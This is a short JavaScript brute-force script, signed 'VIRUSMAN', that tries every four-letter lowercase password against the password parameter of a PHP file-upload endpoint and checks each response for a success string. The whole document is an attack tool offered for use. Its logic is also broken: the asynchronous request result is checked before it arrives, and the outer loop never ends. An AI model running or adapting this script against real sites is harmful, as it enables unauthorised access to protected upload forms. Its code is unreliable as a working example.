<script>
document.write("<b>Start Brute force by VIRUSMAN:</b><br>");
var maxLength = 4;
var charSet = "abcdefghijklmnopqrstuvwxyz"; 
var size = charSet.length;
var base = Array();
var counter = 0;
var baseSize = 4;
var strpass='';
var Textfor = 0;
var chack=0;
// 4 digit
base[3]=0;
base[2]=0;
base[1]=0;
base[0]=0;

while(baseSize <= maxLength) {
   for(i4=0;i4<size;i4++) {
   base[3]=i4;
     for(i3=0;i3<size;i3++) {
     base[2]=i3;
        for(i2=0;i2<size;i2++) {
        base[1]=i2;
                for(i=0;i<size;i++) {
                base[0] = i;
                    for(j=baseSize-1;j>=0;j--) strpass=strpass.concat(charSet[base[j]]); 
                    if(showHint(strpass)) chack=1;
                    document.write(strpass);
                    if(chack==1)break;
                    strpass='';   
               }if(chack==1)break;
            }if(chack==1)break;
        }if(chack==1)break;
   }document.write(strpass);
   if(chack==1)break;
     document.write("<Not found>");     
}
function showHint(str) {
    var ch=0;
        xmlhttp = new XMLHttpRequest();
          xmlhttp.onreadystatechange = function() {
           if (this.readyState == 4 && this.status == 200) {
                Textfor = this.responseText;
                if(Textfor.indexOf("Error: File") >= 0) { //check for found
                    ch=1; 
                  }        
           }
       }
       xmlhttp.open("GET", "http://localhost/up1file.php?action=do_upload&password="+str, true); //link and parameter
       xmlhttp.send();
       return ch;
   }
</script>